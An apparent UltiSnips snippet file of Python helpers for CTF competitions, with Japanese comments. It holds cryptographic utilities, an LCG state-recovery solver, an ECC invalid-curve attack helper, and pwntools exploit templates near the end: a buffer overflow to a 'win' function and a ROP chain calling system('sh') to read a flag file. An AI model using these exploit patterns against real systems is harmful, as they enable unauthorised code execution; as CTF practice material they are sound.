snippet solve_field_equations "solve field equation by sympy"
import sympy as sp
def r_to_f(rational, f):
		return f(rational.p) / f(rational.q)
f = sp.FF(811)
eq1 = sp.Poly(a + b + c - 1, a, b, c, domain=f)
eq2 = sp.Poly(2 * a + b + 3 * c - 10, a, b, c, domain=f)
eq3 = sp.Poly(5 * a + 3 * b + 3 * c, a, b, c, domain=f)
ans = sp.solve([eq1, eq2, eq3])
print(eq1(r_to_f(ans[a], f), r_to_f(ans[b], f), r_to_f(ans[c], f)))
print(eq2(r_to_f(ans[a], f), r_to_f(ans[b], f), r_to_f(ans[c], f)))
print(eq3(r_to_f(ans[a], f), r_to_f(ans[b], f), r_to_f(ans[c], f)))

endsnippet

snippet docstring "docstring" b
desc

Parameters
----------
arg1: int
    fuga

Returns
-------
ans: int

Raises
------
Exception
    desc

Examples
--------
>>> fuga(1)
endsnippet

snippet LCG-solver "linear congruential generator solver" b
# xs[i] = a * x_{i-1} + b mod M
# xsは4~6個ほどほしい
xs = []
ts = []
for i in range(0, len(xs) - 1):
    ts.append(xs[i + 1] - xs[i])

# 1. modのがわからない場合はMの候補を探す
# ms = []
# for i in range(0, len(ts) - 2):
#     ms.append(ts[i] * ts[i + 2] - ts[i + 1] * ts[i + 1])
#
# print(ms)
#
# print('Mの候補')
# print(gcd(ms[0], ms[1]), gcd(ms[0], ms[2]), gcd(ms[0], ms[3]), gcd(ms[1], ms[2]), gcd(ms[1], ms[3]), gcd(ms[2], ms[3]))

# 2. Mがわかれば aとbもわかる
# M = 'dummy modulus'
# a = ts[1] * inverse(ts[0], M) % M
# b = xs[1] - a * xs[0] % M
# ic(M, a, b)


# 3. 次の数を10個予測
for _ in range(0, 10):
    next_num = (a * xs[-1] + b) % M
    ic(next_num)
    xs.append(next_num)
endsnippet

snippet pow-bainary "バイナリ法" b
# バイナリ法 O(log(n))
def mypow(x: int, y: int, mod: int):
    if y == 0:
        return 1

    y2 = mypow(x, y // 2, mod)
    z = y2 * y2
    if y % 2 == 1: # 奇数のときはxを一個かけておく //で切り捨てられるので
        z *= x
    return z % mod
endsnippet

snippet inverse "逆元を求める" b
# modを法として逆元求める
# return y (y * num + k mod == y)
def inverse(num: int, mod: int) -> int:
    x0 = 1
    y0 = 0
    x1 = 0
    y1 = 1
    a = num % mod
    b = mod
    while b != 0:
        q = a // b
        pre_b = b
        pre_a = a
        a = pre_b
        b = pre_a % pre_b

        pre_x0 = x0
        pre_x1 = x1
        x0 = pre_x1
        x1 = pre_x0 - q * pre_x1

        pre_y0 = y0
        pre_y1 = y1
        y0 = pre_y1
        y1 = pre_y0 - q * pre_y1
    if a != 1:
        ic(a, b, x0, x1, y0, y1)
        raise Exception(f'modular inverse does not exist for num: {num}, moduler: {mod}')

    if x0 < 0:
        q = x0 // mod
        x0 -= (q - 1) * mod

    x0 = x0 % mod
    return x0
endsnippet

snippet import-crypto "cryptoでよく使うpackage" b
from icecream import ic
import math
import sys
import binascii
import functools

# progress bar表示する
from tqdm import tqdm
from Crypto.Util.number import *
from gmpy2 import iroot
from pwn import remote

sys.setrecursionlimit(100000)
def bxor(a, b):
    res = [c1 ^ c2 for (c1, c2) in zip(a, b)]
    return bytes(res)
endsnippet

snippet reverse-int2message "intをstringのメッセージに戻す" b
ic(binascii.unhexlify(hex(m)[2:]))
endsnippet

snippet euclid "一次不定方程式を解く" b
def ex_euclid(a, b):
    """
    一次不定方程式 ax+by = gcd(a,b)を解く
    (a > b)

    returns
    -------
    n : int
        n = gcd(a,b)
    x : int
        解x
    y : int
        解y
    """
    assert a > b and b > 0

    x1, y1, m = 1, 0, a
    x2, y2, n = 0, 1, b
    while m % n != 0:
        q = m // n
        x1, y1, m, x2, y2, n = x2, y2, n, x1-q*x2, y1-q*y2,  m-q*n

    return (n, x2, y2)

endsnippet

snippet ECC_invalid_curve_attack "適当な位数3の点を持つ曲線を見つける" b
# invalid curve attack
# 適当な位数3の点を持つ曲線を見つける
# 以下の例はp256の曲線に対する攻撃
from sage.all import *

A = -3
B = 41058363725152142129326129780047268409114441015993725554835256314039467401291
P = 115792089210356248762697446949407573530086143415290314195533631308867097853951
F = GF(P)
size = EllipticCurve(F, [A, B]).order()
print(size)

cur = 1
b = 2
while True:
    try:
        EC = EllipticCurve(F, [A, b])
    except Exception:
        b += 1
        continue
    order = EC.order()

    if (order // 3 * 3 == order):
        suborder = 3
    else:
        b += 1
        continue
    g = EC.gen(0) * int(order // suborder)
    print({
        "generator": g.xy(),
        "order": suborder,
        "b": b,
    })

    b += 1
endsnippet

snippet chinese_remainder "中国剰余人定理" b
# modの配列nを受け取り暗号文の配列aを受け取る
def chinese_remainder(n, a):
    sum = 0
    prod = functools.reduce(lambda a, b: a * b, n)
    for n_i, a_i in zip(n, a):
        p = prod // n_i
        sum += a_i * inverse(p, n_i) * p
    return sum % prod
endsnippet

snippet jacobi_symbol "ヤコビ記号 奇数modulorのときに平方剰余かどうかを確認できる" b
# https://tex2e.github.io/blog/crypto/legendre-and-jacobi-symbls
# jacobi_symbol
def jacobi_symbol(a, n):
    if n < 0 or not n % 2:
        raise ValueError("n should be an odd positive integer")
    if a < 0 or a > n:
        a = a % n
    if n == 1 or a == 1:
        return 1
    if math.gcd(a, n) != 1:
        return 0

    j = 1
    if a < 0:
        a = -a
        if n % 4 == 3:
            j = -j
    while a != 0:
        while a % 2 == 0 and a > 0:
            a >>= 1
            if n % 8 in (3, 5):
                j = -j
        a, n = n, a
        if a % 4 == 3 and n % 4 == 3:
            j = -j
        a %= n
    if n != 1:
        j = 0
    return j
endsnippet

snippet ctf_bof_sample "BOFサンプル" b
from pwn import *
import os

context.log_level = 'critical'
HOST = '0.0.0.0'
PORT = 9000
io = remote(HOST, PORT)

binfile = './chall'
e = ELF(binfile)
context.binary = binfile

print(hex(e.sym['win']), pack(e.sym['win']))

pad = b'a' * 0x28

payload = pad + pack(e.sym['win'])
print(payload)

io.sendlineafter(b'name?', str(100).encode())
io.sendlineafter(b'name?', payload)

a = io.recvuntil(b'ctf4b')
print(a)
print('ctf4b' + io.readline().decode(), end='')
endsnippet

snippet ctf_remote "remote接続のサンプル" b
binfile = "./chall"
context.binary = binfile
context.log_level = "critical"
HOST = "0.0.0.0"
PORT = 9001
io = remote(HOST, PORT)
io = gdb.debug(
    binfile,
    """
   break main
""",
)

elf = ELF(binfile)
endsnippet
snippet ctf_rop_sample "ROPのサンプル" b
from pwn import *
import os
#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9001'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

io = remote(HOST, PORT)

pad = b'a' * 0x18

rop = ROP(e)
# helpをみるとsystemは引数にrdiをとるので，
# rdiに"sh"をいれたい
# pop rdi; retのならびの場所を探す
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
# pop rdi; retの場所にretすることになるので，
# rdiに入れる値を挿入する
# rdiに'sh\0'を
rop.raw(pack(next(e.search(b'sh\0'))))
# rop.raw(pack(0x00000000004020f4))
# 最後にsystemを読んで上げれば良い!!
rop.raw(pack(e.sym['help']+0xf)) # system()

payload = pad + rop.chain()
print(payload)

assert(len(payload) <= 0x30)

io.sendlineafter(b'?', payload)

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited\n', b'cat flag.txt')

print(io.readline().decode('utf-8', 'ignore'), end='')
print('ctf4b' + io.readline().decode(), end='')
endsnippet
